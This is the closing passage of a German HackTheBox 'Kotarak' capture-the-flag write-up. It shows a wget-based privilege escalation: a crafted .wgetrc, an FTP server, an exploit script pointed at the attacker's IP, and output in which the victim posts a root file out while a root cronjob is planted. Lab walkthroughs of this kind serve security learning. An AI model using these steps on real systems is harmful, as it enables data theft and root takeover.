</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print &#34;</span>Serving wget exploit on port %s...<span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34; % HTTP_LISTEN_PORT
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">handler.serve_forever()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--[ eof ]---
</span></span></span></code></pre></div><p>Befolgen wir die Anleitung, anstatt <strong>/etc/shadow</strong> wollen wir allerdings <strong>/root/root.txt</strong> erhalten!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~/kotarak# mkdir ftptest
</span></span><span style="display:flex;"><span>root@kali:~/kotarak# cd ftptest/
</span></span><span style="display:flex;"><span>root@kali:~/kotarak/ftptest# cat <span style="color:#e6db74">&lt;&lt;_EOF_&gt;.wgetrc
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&gt; post_file = /root/root.txt
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&gt; output_document = /etc/cron.d/wget-root-shell
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&gt; _EOF_</span>
</span></span><span style="display:flex;"><span>root@kali:~/kotarak/ftptest# cat .wgetrc 
</span></span><span style="display:flex;"><span>post_file <span style="color:#f92672">=</span> /root/root.txt
</span></span><span style="display:flex;"><span>ouput_document <span style="color:#f92672">=</span> /etc/cron.d/wget-root-shell
</span></span></code></pre></div><p>Nun <strong>pyftpdlib</strong> installieren, falls noch nicht vorhanden</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~/kotarak/ftptest# sudo pip install pyftpdlib
</span></span><span style="display:flex;"><span>Reuirement already satisfied: pyftpdlib in /usr/local/lib/python2.7/dist-packages
</span></span></code></pre></div><p>pyftpdlib ausführen:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~/kotarak/ftptest# python -m pyftpdlib -p21 -w
</span></span><span style="display:flex;"><span>/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:244: RuntimeWarning: write permissions assigned to anonymous user.
</span></span><span style="display:flex;"><span>RuntimeWarning<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>I 2018-03-14 19:17:49<span style="color:#f92672">]</span> &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid<span style="color:#f92672">=</span><span style="color:#ae81ff">11282</span> <span style="color:#f92672">&lt;&lt;&lt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>I 2018-03-14 19:17:49<span style="color:#f92672">]</span> concurrency model: async
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>I 2018-03-14 19:17:49<span style="color:#f92672">]</span> masquerade <span style="color:#f92672">(</span>NAT<span style="color:#f92672">)</span> address: None
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>I2018-03-14 19:17:49<span style="color:#f92672">]</span> passive ports: None
</span></span></code></pre></div><p>Kopieren wir nun den exploit auf Kotarak.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>atanas@kotarak-dmz:/root$ vi exploit.py
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HTTP_LISTEN_IP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0.0.0.0&#39;</span>
</span></span><span style="display:flex;"><span>HTTP_LISTEN_PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>FTP_HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.10.15.158&#39;</span>
</span></span><span style="display:flex;"><span>FTP_PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ROOT_CRON <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;* * * * * root /usr/bin/id &gt; /root/hacked-via-wget \n&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>handler <span style="color:#f92672">=</span> SocketServer.TCPServer<span style="color:#f92672">((</span>HTTP_LISTEN_IP, HTTP_LISTEN_PORT<span style="color:#f92672">)</span>, wgetExploit<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;Ready? Is your FTP server running?&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sock <span style="color:#f92672">=</span> socket.socket<span style="color:#f92672">(</span>socket.AF_INET, socket.SOCK_STREAM<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> sock.connect_ex<span style="color:#f92672">((</span>FTP_HOST, FTP_PORT<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> result <span style="color:#f92672">==</span> 0:
</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;FTP found open on %s:%s. Let&#39;s go then\n&#34;</span> % <span style="color:#f92672">(</span>FTP_HOST, FTP_PORT<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;FTP is down :( Exiting.&#34;</span>
</span></span><span style="display:flex;"><span>exit<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;Serving wget exploit on port %s...\n\n&#34;</span> % HTTP_LISTEN_PORT
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>hadler.serve_forever<span style="color:#f92672">()</span>
</span></span></code></pre></div><p>Bei <strong>FTP_HOST</strong> müssen wir unsere IP-Adresse eintragen.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>atanas@kotarak-dmz:/root$ python exploit.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>soket.error: <span style="color:#f92672">[</span>Errno 13<span style="color:#f92672">]</span> Permission denied
</span></span></code></pre></div><p>Wir können den Exploit nicht ausführen, da die ersten 1024 Ports für <strong>root</strong> reserviert sind.</p>
<p>Es gibt allerdings einen einfachen Trick wie wir dies umgehen können und zwar <a href="https://en.wikipedia.org/wiki/Authbind">Authbind</a>!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>atanas@kotarak-dmz:/root$ authbind python exploit.py
</span></span><span style="display:flex;"><span>Ready? Is your FTP server running?
</span></span><span style="display:flex;"><span>FTP found open on 10.10.15.158:21<span style="color:#ae81ff">\.</span> Let<span style="color:#e6db74">&#39;s go then
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Serving wget exploit on port 80...
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">We have a volunteer requesting /archive.tar.gz by GET :)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Uploading .wetrc via ftp redirect vuln. It should land in /root
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">10.0.3.133 - - [14/Mar/2018 19:43:04] &#34;GET /archive.tar.gz HTTP/1.1&#34; 301 -
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Sending redirect to ftp://anonymous@10.10.15.158:21/.wgetrc
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">We have a volunteer requesting /archive.tar.gz by POST :)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Received POST from wget, this should be the extracted /etc/shadow file:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---[begin]---
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">950#########ZENSIERT#########e2c
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---[eof]---
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Sending back a cronjob script as a thank-you for the file...
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">It should get saved in /etc/cron.d/wget-root-shell on the victim&#39;</span>s host <span style="color:#f92672">(</span>because of .wgetrc we injected in the GET first response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>10.0.3.133 - - <span style="color:#f92672">[</span>14/Mar/2018 19:45:04<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;POST /archive.tar.gz HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</span></span><span style="display:flex;"><span>Fie was served. Check on /root/hacked-via-wget on the victim<span style="color:#960050;background-color:#1e0010">&#39;</span>s host in a minute! :<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Vielen Dank für&rsquo;s durchlesen. :)</p>

      </div>
    </article>

    <hr />

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://www.m10x.de/tags/hackthebox/">hackthebox</a></span>
        <span class="tag"><a href="https://www.m10x.de/tags/ctf/">ctf</a></span>
        <span class="tag"><a href="https://www.m10x.de/tags/german/">german</a></span>
        
    </p>

      

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        2634 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          2018-12-05 15:00
        

         
          
        
      </p>
    </div>
      <hr />
      <div class="sharing-buttons">
        
<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f12%2fhackthebox-kotarak-writeup-tipps--anleitung%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f12%2fhackthebox-kotarak-writeup-tipps--anleitung%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HackTheBox%20-%20Kotarak%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung&amp;caption=HackTheBox%20-%20Kotarak%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung&amp;canonicalUrl=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f12%2fhackthebox-kotarak-writeup-tipps--anleitung%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="mailto:?subject=HackTheBox%20-%20Kotarak%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung&amp;body=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f12%2fhackthebox-kotarak-writeup-tipps--anleitung%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f12%2fhackthebox-kotarak-writeup-tipps--anleitung%2f&amp;media=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f12%2fhackthebox-kotarak-writeup-tipps--anleitung%2f;description=HackTheBox%20-%20Kotarak%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f12%2fhackthebox-kotarak-writeup-tipps--anleitung%2f&amp;title=HackTheBox%20-%20Kotarak%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung&amp;summary=HackTheBox%20-%20Kotarak%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung&amp;source=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f12%2fhackthebox-kotarak-writeup-tipps--anleitung%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f12%2fhackthebox-kotarak-writeup-tipps--anleitung%2f&amp;resubmit=true&amp;title=HackTheBox%20-%20Kotarak%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f12%2fhackthebox-kotarak-writeup-tipps--anleitung%2f;title=HackTheBox%20-%20Kotarak%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung" target="_blank" rel="noopener" aria-label="" title="Share on xing">
  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="whatsapp://send?text=HackTheBox%20-%20Kotarak%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung%20https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f12%2fhackthebox-kotarak-writeup-tipps--anleitung%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f12%2fhackthebox-kotarak-writeup-tipps--anleitung%2f&amp;t=HackTheBox%20-%20Kotarak%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HackTheBox%20-%20Kotarak%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung&amp;url=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f12%2fhackthebox-kotarak-writeup-tipps--anleitung%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
    </div>
  </div>
</a>

      </div>

    
    <div class="pagination">
        

        <div class="pagination__buttons">
            
            <span class="button previous">
                <a href="https://www.m10x.de/posts/2021/04/external-redirect-to-hackmanit.de-is-your-application-vulnerable-to-web-cache-poisoning/">
                    <span class="button__icon">←</span>
                    <span class="button__text">(External: Redirect to hackmanit.de) Is Your Application Vulnerable to Web Cache Poisoning?</span>
                </a>
            </span>
            

            
            <span class="button next">
                <a href="https://www.m10x.de/posts/2018/03/hackthebox-node-writeup-tipps--anleitung/">
                    <span class="button__text">HackTheBox - Node WriteUp | Tipps &#43; Anleitung</span>
                    <span class="button__icon">→</span>
                </a>
            </span>
            
        </div>
    </div>


    

    
      <script defer src=https://commento-plus-plus.kirlia.de/js/commento.js></script>
      <div id="commento"></div>
    

  </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="https://www.m10x.de">m10x</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="https://www.m10x.de/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            <span><a href="https://www.m10x.de/datenschutz">Datenschutz</a></span>
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="https://www.m10x.de/bundle.min.205d491810c28f95aa953fae884e1c27abe13fdf93ec63b882d0036b248d4a6282eb2d134e4e7225c6ad6e86db87b08488a361ca4a7383d01fcff43f3d57b9c3.js" integrity="sha512-IF1JGBDCj5WqlT&#43;uiE4cJ6vhP9&#43;T7GO4gtADaySNSmKC6y0TTk5yJcatbobbh7CEiKNhykpzg9Afz/Q/PVe5ww=="></script>



    </body>
</html>
